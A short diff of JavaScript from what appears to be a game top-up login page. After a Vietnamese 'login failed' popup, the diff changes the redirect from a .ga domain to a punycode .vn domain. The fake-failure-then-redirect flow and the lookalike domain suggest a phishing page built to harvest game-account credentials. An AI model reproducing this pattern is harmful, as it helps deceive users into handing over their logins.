@@ -47,7 +47,7 @@ function telephoneCheck(str) {
  title: 'Đăng nhập thất bại',
  text: 'Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!',
  }).then((result) => {
- window.location.href = "https://napthe-ff.ga/";
+ window.location.href = "https://xn--npth-5q5a1g.vn/";
     })
  }
  document.querySelector('#login_form').onsubmit = function(e){
